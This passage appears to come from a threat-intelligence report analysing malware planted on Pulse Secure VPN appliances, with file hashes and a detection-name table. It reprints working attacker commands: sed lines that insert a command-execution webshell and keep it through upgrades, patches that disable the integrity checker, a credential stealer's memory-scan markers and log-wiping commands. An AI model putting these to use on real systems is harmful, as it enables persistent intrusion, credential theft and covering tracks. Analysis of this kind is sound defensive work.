class=\u0022code\u0022\u003EContent-type:text\/html\u003C\/span\u003E\u0026nbsp;and the command output printed. Following this, the script exits.\u003C\/p\u003E\n\u003Ch5\u003EQUIETPULSE\u003Ci\u003E\u003C\/i\u003E\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Edsserver\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E9f6ac39707822d243445e30d27b8404466aa69c61119d5308785bf4a464a9ebd\u003C\/span\u003E) is a legitimate Perl script with malicious modifications to fork the child process \u003Cspan class=\u0022code\u0022\u003E\/home\/bin\/dshelper\u003C\/span\u003E. The dshelper script does not exist on a clean PulseSecure installation, this file is described as QUIETPULSE Utility Script.\u003C\/p\u003E\n\u003Ch5\u003EQUIETPULSE Utility Script\u003Ci\u003E\u003C\/i\u003E\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Edshelper\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003Ec774eca633136de35c9d2cd339a3b5d29f00f761657ea2aa438de4f33e4bbba4\u003C\/span\u003E) is a shell script invoked by a malicious version of \u003Cspan class=\u0022code\u0022\u003Edsserver\u003C\/span\u003E that primarily functions as a utility script responsible for copying files and executing commands. Like the ATRIUM patcher, this script accesses \/tmp\/data, a path which is used during a system upgrade. This file is therefore, like the ATRIUM patcher, used by the attacker to maintain persistence. The script is set to execute in a loop where four main checks are executed every two minutes. The checks are as follows:\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ECheck 1\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EIf \u003Cspan class=\u0022code\u0022\u003E\/tmp\/data\/root\/home\/webserver\/htdocs\/dana-na\/auth\/compcheckjava.cgi\u003C\/span\u003E exists and is non-empty then execute:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Egrep -c -s \u0027system($depara)\u0027 \/tmp\/data\/root\/home\/webserver\/htdocs\/dana-na\/auth\/compcheckjava.cgi\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EIt checks if the file has the contents \u003Cspan class=\u0022code\u0022\u003Esystem($depara)\u003C\/span\u003E. If the file does not contain this content, then retrieve the first line of the file by executing:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Esed -n 1p \/tmp\/data\/root\/home\/webserver\/htdocs\/dana-na\/auth\/compcheckjava.cgi\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThen copy a file via:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Ecp \/home\/webserver\/htdocs\/dana-na\/auth\/compcheckjava.cgi \/tmp\/data\/root\/home\/webserver\/htdocs\/dana-na\/auth\/compcheckjava.cgi\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThen replace the copy\u2019s first line with the one retrieved from the sed above via:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Esed -i 1c\u0026quot;\u0026lt;varies\u0026gt;\u0026quot; \/tmp\/data\/root\/home\/webserver\/htdocs\/dana-na\/auth\/compcheckjava.cgi\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003ECheck 2\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EIf \u003Cspan class=\u0022code\u0022\u003E\/tmp\/data\/root\/home\/bin\/\u003C\/span\u003E exists as a directory, then check if the file \u003Cspan class=\u0022code\u0022\u003E\/tmp\/data\/root\/home\/bin\/dshelper\u003C\/span\u003E does not exist. If it does not exist, then place it there by copying a file via:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Ecp -p \/home\/bin\/dshelper \/tmp\/data\/root\/home\/bin\/\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003ECheck 3\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EIf \u003Cspan class=\u0022code\u0022\u003E\/tmp\/data\/root\/home\/bin\/dsserver\u003C\/span\u003E exists and is non-empty then execute the following to check if the file does not contain the string \u003Cspan class=\u0022code\u0022\u003Eexec(\u0026quot;\/home\/bin\/dshelper\u0026quot;)\u003C\/span\u003E:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Egrep -c -s \u0027exec(\u0026quot;\/home\/bin\/dshelper\u0026quot;)\u0027 \/tmp\/data\/root\/home\/bin\/dsserver\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EIf it doesn\u0027t then execute to insert the line:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Esed -i \u0027s\/for (;;)\/my $monpid = fork();\\nif ($monpid == 0) {\\nexec(\\\u0026quot;\\\/home\\\/bin\\\/dshelper\\\u0026quot;);\\n}\\n\u0026amp;\/g\u0027 \/tmp\/data\/root\/home\/bin\/dsserver\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003ECheck 4\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EIf the file \u003Cspan class=\u0022code\u0022\u003E\/tmp\/data\/root\/home\/bin\/check_integrity.sh\u003C\/span\u003E exists and is non-empty, then check if the file contains the string \u003Cspan class=\u0022code\u0022\u003Eexit 1\u003C\/span\u003E by executing:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Egrep -c -s \u0027exit 1\u0027 \/tmp\/data\/root\/home\/bin\/check_integrity.sh\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EIf the file does contain this content, then execute the following to switch the content to \u003Cspan class=\u0022code\u0022\u003Eexit 0\u003C\/span\u003E:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Esed -i \u0027s\/exit 1\/exit 0\/g\u0027 \/tmp\/data\/root\/home\/bin\/check_integrity.sh\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003EPULSEJUMP\u003C\/h5\u003E\n\u003Cp\u003EThe file with SHA256: \u003Cspan class=\u0022code\u0022\u003E7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a\u003C\/span\u003E is a system information and credential harvesting Perl script. The sample writes information from multiple sources to the file\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003E\/tmp\/dsactiveuser.statementcounters\u003C\/span\u003E\u0026nbsp;in append mode.\u003C\/p\u003E\n\u003Cp\u003EThe sample begins by retrieving all auth servers via the API\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003EAuthAdmin::getAllAuthServers\u003C\/span\u003E. and logs the results. Next, the sample logs all roles via the API\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003EDSRole::GeneralAdmin::getRoles\u003C\/span\u003E and writes the values to the file. The sample may also retrieve and log additional information depending on the device configuration.\u003C\/p\u003E\n\u003Ch5\u003EHARDPULSE\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Ecompcheckjava.cgi\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc\u003C\/span\u003E) has the ability to read and write arbitrary files and may execute arbitrary commands depending on the implementation of a particular library function.\u003C\/p\u003E\n\u003Cp\u003EThe sample responds to HTTP GETs and PUTs. The GET path is not relevant, but the PUT path first checks if the incoming requests \u003Cspan class=\u0022code\u0022\u003Echeckcode\u003C\/span\u003E POST param is equal to a hardcoded passcode. If this check passes the sample inspects the param \u003Cspan class=\u0022code\u0022\u003Ehashid\u003C\/span\u003E to determine if it\u0027s non-empty. If non-empty the sample displays a prompt to the user that includes hardware information and then base64 decodes the param \u003Cspan class=\u0022code\u0022\u003Ehashid\u003C\/span\u003E and checks it against pulsesecure. If this matches a recoveryToken is generated which is the MD5 hash of 16 random bytes, with the result hash truncated to 8 characters. This token is then displayed to the user via the URL \u003Cspan class=\u0022code\u0022\u003Ehttps:\/\/ive-host\/dana-na\/auth\/recover[.]cgi?token=\u0026lt;varies\u0026gt;\u003C\/span\u003E and the sample exits. If this check did not match then the sample passes the base64 decoded data to a routine \u003Cspan class=\u0022code\u0022\u003EDSSafe::psystem\u003C\/span\u003E which may execute shell commands, however this implementation is not provided and is speculation.\u003C\/p\u003E\n\u003Cp\u003EIf the param hashid is empty the sample instead checks that the param \u003Cspan class=\u0022code\u0022\u003Em\u003C\/span\u003E is non-empty. If so, it\u0027s matched against get and put which will read\/write arbitrary files to the host, respectively.\u003C\/p\u003E\n\u003Ch5\u003EATRIUM\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Ecompcheckresult.cgi\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003Ef2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90\u003C\/span\u003E) is a webshell capable of arbitrary command execution. The sample has malicious logic inserted at the end of legitimate logic. The malicious logic inspects all requests of any type looking for the HTTP query parameter \u003Cspan class=\u0022code\u0022\u003Eid\u003C\/span\u003E. If this query parameter exists, the sample executes it verbatim on using the \u003Cspan class=\u0022code\u0022\u003Esystem\u003C\/span\u003E API. The sample does not encode or obfuscate the command in any way. If the query parameter is not found in the request, then the original legitimate logic is invoked.\u003C\/p\u003E\n\u003Ch5\u003EPersistence Patcher\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003EDSUpgrade.pm\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450\u003C\/span\u003E) is a patcher utility script responsible for persisting webshells across a system upgrade. We\u2019ve observed variants of this utility targeting the persistence of multiple webshell families, notably ATRIUM, STEADYPULSE, and PULSECHECK. Like previous patchers, this sample uses \u003Cspan class=\u0022code\u0022\u003Esed\u003C\/span\u003E to insert malicious logic. The attacker likely chose \u003Cspan class=\u0022code\u0022\u003EDSUpgade.pm\u003C\/span\u003E to host their patch logic as it is a core file in the system upgrade procedure, ensuring the patch is during updates. The patcher modifies content in \u003Cspan class=\u0022code\u0022\u003E\/tmp\/data\u003C\/span\u003E as this directory holds the extracted upgrade image the newly upgraded system will boot into. This results in a persistence mechanism which allows the attacker to maintain access to the system across updates.\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Emy $cmd_x=\u0026quot;sed -i \u0027\/echo_console \\\u0026quot;Saving package\\\u0026quot;\/i(\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; sed -i \\\\\\\u0027\/main();\\\\\\$\/cif(CGI::param(\\\\\\\\\\\u0026quot;id\\\\\\\\\\\u0026quot;)){\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print \\\\\\\\\\\u0026quot;Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\u0026quot;;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print \\\\\\\\\\\u0026quot;Content-type: text\/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\u0026quot;;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; my \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\u0026quot;id\\\\\\\\\\\u0026quot;);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; system(\\\\\\\\\\\u0026quot;\\\\\\\\\\$na\\\\\\\u0026quot;);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; } else{\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026amp;main();\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; }\\\\\\\u0027 \/tmp\/data\/root$cgi_p;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; cp -f \/home\/perl\/DSUpgrade.pm \/tmp\/data\/root\/home\/perl;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; cp -f \/pkg\/dspkginstall \/tmp\/data\/root\/pkg\/;\u003Cbr\u003E\n )\u0027\/pkg\/do-install\u0026quot;;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe patcher also performs additional shell commands for unpacking a compressed package:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esystem(\u0026quot;\/bin\/mount -o remount,rw \/dev\/root \/\u0026quot;);\u003Cbr\u003E\n system(\u0026quot;\/bin\/tar\u0026quot;, \u0026quot;-xzf\u0026quot;, \u0026quot;\/tmp\/new-pack.tgz\u0026quot;, \u0026quot;-C\u0026quot;, \u0026quot;\/tmp\u0026quot;,\u0026quot;.\/installer\u0026quot;);\u003Cbr\u003E\n system(\u0026quot;cp -f \/tmp\/installer\/do-install \/pkg\/\u0026quot;);\u003Cbr\u003E\n system(\u0026quot;cp -f \/tmp\/installer\/VERSION \/pkg\/\u0026quot;);\u003Cbr\u003E\n system(\u0026quot;cp -f \/tmp\/installer\/sysboot-shlib \/pkg\/\u0026quot;);\u003Cbr\u003E\n system(\u0026quot;cp -f \/tmp\/installer\/losetup \/pkg\/\u0026quot;);\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003EPACEMAKER\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Ememread\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2\u003C\/span\u003E) is a credential stealer. The sample has the usage information:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EUsage: memread [-t time(minute)] [-m size(MB)] [-s sleep_interval(second)]\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe sample starts by setting an alarm that kills the application after a configurable number of minutes, 14 by default. It then enters a loop which reads \u003Cspan class=\u0022code\u0022\u003E\/proc\/\u003C\/span\u003E entries every 2 seconds looking for a target application, this interval is also configurable. The target is found by opening \u003Cspan class=\u0022code\u0022\u003E\/proc\/\u0026lt;process_name\u0026gt;\/cmdline\u003C\/span\u003E for each entry in the folder and then reading this file looking for the string \u003Cspan class=\u0022code\u0022\u003Edswsd\u003C\/span\u003E within the command line. Once found the target application\u0027s \u003Cspan class=\u0022code\u0022\u003Eproc\/\u0026lt;target_pid\u0026gt;\/mem\u003C\/span\u003E is opened, the process is attached to with PTRACE, then memory read in chunks up to 512 bytes in size. For each chunk, the string \u003Cspan class=\u0022code\u0022\u003E20 30 20 0A 00 ( 0 \\n)\u003C\/span\u003E is searched for as a needle. If found the sample splits the data by first space, then a dash -. Two dashes are expected to be found, and these are immediately converted into hex numbers, example form: -\u0026lt;number\u0026gt;. If the second number minus the first is \u0026gt; 8191 the sample reads the data starting at the file offset of the first number, up to a size specified by second number minus first number.\u003C\/p\u003E\n\u003Cp\u003EOnce the sample has read the process memory and found all memory data of interest the sample detaches PTRACE then the sample begins memory scanning the copied data. The sample tries to locate a sequence of \u0027flags\u0027 in memory one by one to locate what seem to be information the attacker wishes to steal. This information is not known, nor is the structure of it. The sequences scanned for generally have start and end scan sequences which in order scanned for, are:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EUSER_START_FLAG: 3C 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 05 00\u003Cbr\u003E\n USER_END_FLAG: 3C 2F 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 00\u003Cbr\u003E\n PASSWORD_START_FLAG: 3C 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00\u003Cbr\u003E\n PASSWORD_END_FLAG: 3C 2F 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00\u003Cbr\u003E\n AUTHNUM_START_FLAG: 3C 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00\u003Cbr\u003E\n AUTHNUM_END_FLAG: 3C 2F 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EIf all these sequences are found, the data between the start and end is extracted and eventually formatted and written to the file \u003Cspan class=\u0022code\u0022\u003E\/tmp\/dsserver-check.statementcounters\u003C\/span\u003E. The approximate format of this data is:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EName:\u0026lt;username\u0026gt; || Pwd:\u0026lt;password\u0026gt; || AuthNum:\u0026lt;authnumber\u0026gt;\\n\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe sample replaces the following URL encoded values with their ascii representation for the password:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026amp;amp; -\u0026gt;\u0026nbsp; \u0026amp;\u003Cbr\u003E\n \u0026amp;lt;\u0026nbsp; -\u0026gt;\u0026nbsp; \u0026lt;\u003Cbr\u003E\n \u0026amp;gt;\u0026nbsp; -\u0026gt;\u0026nbsp; \u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003EPACEMAKER Launcher Utility\u003C\/h5\u003E\n\u003Cp\u003EAs part of our investigation into PACEMAKER we were able to retrieve a simple bash script responsible for launching the credential stealer. The launcher script hash SHA256 \u003Cspan class=\u0022code\u0022\u003E4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec\u003C\/span\u003E launches PACEMAKER from a hardcoded path with options specifying a 16MB memory read size and a memory scan interval of 2 seconds, with a variable self-kill time.\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E#!\/bin\/bash\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/bin\/memread -t $1 -m 16 -s 2 \u0026amp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ETHINBLOOD Log Wiper Utility\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Edsclslog\u003C\/span\u003E with SHA256 \u003Cspan class=\u0022code\u0022\u003E88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079\u003C\/span\u003E is a log wiper utility. The sample provides the usage information:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EUsage: dsclslog -f [events|access] -r [Regex1,Regex2,Regex3,...]\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe \u003Cspan class=\u0022code\u0022\u003E\u2013f\u003C\/span\u003E flag specifies if the file \u003Cspan class=\u0022code\u0022\u003Elog.events.vc0\u003C\/span\u003E or \u003Cspan class=\u0022code\u0022\u003Elog.access.vc0\u003C\/span\u003E within the directory \u003Cspan class=\u0022code\u0022\u003E\/home\/runtime\/logs\u003C\/span\u003E should be modified. To perform its log cleaning operations the sample first makes two copies of whichever log file was chosen, but uses \u003Cspan class=\u0022code\u0022\u003E.vc1\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003E.vc2\u003C\/span\u003E as the extension for the new files. The file with the \u003Cspan class=\u0022code\u0022\u003E.vc1\u003C\/span\u003E is used to search for entries that match the given entries, and the file with the \u003Cspan class=\u0022code\u0022\u003E.vc2\u003C\/span\u003E extension is used as a temporary file where the cleaned log is written. After generating both files and log cleaning is finished the sample executes the following commands via the system API to overwrite the original log with the cleaned version, then removes the intermediate:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Emv \/home\/runtime\/logs\/log.\u0026lt;logtype\u0026gt;.vc2\u003Cbr\u003E\n \/home\/runtime\/logs\/log.\u0026lt;logtype\u0026gt;.vc0\u003Cbr\u003E\n rm \/home\/runtime\/logs\/log.\u0026lt;logtype\u0026gt;.vc1\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ETHINBLOOD LogWiper Utility Variant\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Eclear_log.sh\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9\u003C\/span\u003E) is a BASH script responsible for zeroing log lines that match a given regex pattern. The sample is similar to the compiled \u003Cspan class=\u0022code\u0022\u003ETHINBLOOD\u003C\/span\u003E Log Wiper but edits logs in-place with sed rather than making temporary copies. The sed commands used are:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esed -i \u0026quot;s\/.\\x00[^\\x00]*\u0026lt;regex_string\u0026gt;[^\\x00]*\\x09.\\x00\/\/g\u0026quot; \/data\/runtime\/logs\/\u0026lt;logfile\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esed -i \u0026quot;s\/\\x\u0026lt;hex_char\u0026gt;\\x00[^\\x00]*$2[^\\x00]*\\x09\\x\u0026lt;hex_char\u0026gt;\\x00\/\/g\u0026quot; \/data\/runtime\/logs\/\u0026lt;logfile\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe sample embeds the usage information:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eusage: \/home\/bin\/bash clear_log.sh [logfile] [keyword(regex)]\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ELOCKPICK\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Elibcrypto.so\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E2610d0372e0e107053bc001d278ef71f08562e5610691f18b978123c499a74d8\u003C\/span\u003E) is a shared object containing cryptographic logic from openssl. The sample contains a modification to the routine \u003Cspan class=\u0022code\u0022\u003Ebnrand_range\u003C\/span\u003E that breaks the security of the random numbers generated. There are three paths in this routine for generating a random big number between a given range. The first case is unmodified and generates a zeroed big number, the other two cases are patched so that a constant value overwrites the generated random value and always returns success. This breaks the random number generation by replacing it with a value the attacker knows in all cases.\u003C\/p\u003E\n\u003Ch5\u003ELOCKPICK Patcher\u003C\/h5\u003E\n\u003Cp\u003EThe file with the hash \u003Cspan class=\u0022code\u0022\u003Eb990f79ce80c24625c97810cb8f161eafdcb10f1b8d9d538df4ca9be387c35e4\u003C\/span\u003E is a patcher utility responsible for inserting the malicious logic known as LOCKPICK. The patcher starts by running sed on the integrity checker script built into the appliance to insert an early exit routine. This is inserted by the command \u003Cspan class=\u0022code\u0022\u003Esed -i \u002712aexit 0\u0027 \/home\/bin\/check_integrity.sh\u003C\/span\u003E which when applied causes this script to exit without performing its intended checks. After this the sample uses python file read\/write APIs to insert long strings of assembly that represent the logic known as LOCKPICK. This file is different from the other patchers we\u2019ve identified in that it is python and specifically targets system integrity routines.\u003C\/p\u003E\n\u003Ch4\u003EDetecting the Techniques\u003C\/h4\u003E\n\u003Cp\u003EThe following table contains specific FireEye product detection names for the malware families associated with the exploitation of Pulse Secure VPN device.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022695\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022221\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EPlatform(s)\u0026nbsp;\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EDetection Name\u0026nbsp;\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022221\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENetwork Security\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EEmail Security\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EDetection\u0026nbsp;On\u0026nbsp;Demand\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EMalware\u0026nbsp;File Scanning\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EMalware\u0026nbsp;File\u0026nbsp;Storage Scanning\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_APT_Webshell_PL_HARDPULSE_1\u003Cbr\u003E\nFEC_APT_Webshell_PL_HARDPULSE_1\u003Cbr\u003E\nAPT.Webshell.PL.HARDPULSE\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Trojan_PL_PULSEJUMP_1\u003Cbr\u003E\nFEC_APT_Trojan_PL_PULSEJUMP_1\u003Cbr\u003E\nFE_Trojan_PL_Generic_1\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Trojan_PL_RADIALPULSE_1\u003Cbr\u003E\nFEC_APT_Trojan_PL_RADIALPULSE_1\u003Cbr\u003E\nFE_APT_Trojan_PL_RADIALPULSE_2\u003Cbr\u003E\nFE_APT_Trojan_PL_RADIALPULSE_3\u003Cbr\u003E\nFEC_APT_Trojan_PL_RADIALPULSE_2\u003Cbr\u003E\nFE_APT_Trojan_PL_RADIALPULSE_4\u003Cbr\u003E\nFEC_APT_Trojan_PL_RADIALPULSE_3\u003Cbr\u003E\nFE_APT_Trojan_PL_RADIALPULSE_5\u003Cbr\u003E\nFE_APT_Tool_SH_RADIALPULSE_1\u003Cbr\u003E\nFEC_APT_Tool_SH_RADIALPULSE_1\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Trojan_Linux32_PACEMAKER_1\u003Cbr\u003E\nFE_APT_Trojan_Linux_PACEMAKER_1\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Backdoor_Linux32_SLOWPULSE_1\u003Cbr\u003E\nFE_APT_Backdoor_Linux32_SLOWPULSE_2\u0026nbsp;\u003Cbr\u003E\nFE_APT_Trojan_Linux32_SLOWPULSE_1\u0026nbsp;\u003Cbr\u003E\nFE_APT_Tool_Linux32_SLOWPULSE_1\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Webshell_PL_STEADYPULSE_1\u0026nbsp;\u003Cbr\u003E\nFEC_APT_Webshell_PL_STEADYPULSE_1\u0026nbsp;\u003Cbr\u003E\nAPT.Webshell.PL.STEADYPULSE\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Trojan_Linux32_LOCKPICK_1\u003C\/p\u003E\n\u003Cp\u003EFE_Webshell_PL_ATRIUM_1\u0026nbsp;\u003Cbr\u003E\nFEC_Webshell_PL_ATRIUM_1\u003Cbr\u003E\nFE_Trojan_SH_ATRIUM_1\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Webshell_PL_SLIGHTPULSE_1\u003Cbr\u003E\nFEC_APT_Webshell_PL_SLIGHTPULSE_1\u003Cbr\u003E\nAPT.Webshell.PL.SLIGHTPULSE\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Webshell_PL_PULSECHECK_1\u003Cbr\u003E\nFEC_APT_Webshell_PL_PULSECHECK_1\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Tool_Linux32_THINBLOOD_1\u0026nbsp;\u003Cbr\u003E\nFE_APT_Tool_Linux_THINBLOOD_1\u0026nbsp; \u0026nbsp; \u0026nbsp;\u0026nbsp;\u003Cbr\u003E\nFE_APT_Tool_SH_THINBLOOD_1\u0026nbsp;\u003Cbr\u003E\nFEC_APT_Tool_SH_THINBLOOD_1\u003Cbr\u003E\nAPT.Tool.Linux.THINBLOOD.MVX\u003C\/p\u003E\n\u003Cp\u003EFE_APT_Trojan_PL_QUIETPULSE_1\u003Cbr\u003E\nFEC_APT_Trojan_PL_QUIETPULSE_1\u0026nbsp;\u003Cbr\u003E\nFE_Trojan_SH_Generic_2\u0026nbsp;\u003Cbr\u003E\nFEC_Trojan_SH_Generic_3\u003C\/p\u003E\n\u003Cp\u003ESuspicious Pulse Secure HTTP request (IPS)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022221\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EEndpoint Security\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EReal-Time (IOC)\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ESLOWPULSE (BACKDOOR)\u003C\/li\u003E\n\u003Cli\u003EPACEMAKER (LAUNCHER)\u003C\/li\u003E\n\u003Cli\u003ETHINBLOOD (UTILITY)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022221\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHelix\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EVPN ANALYTICS [Abnormal Logon]\u003Cbr\u003E\nEXPLOIT - SONICWALL ES [CVE-2021-20021 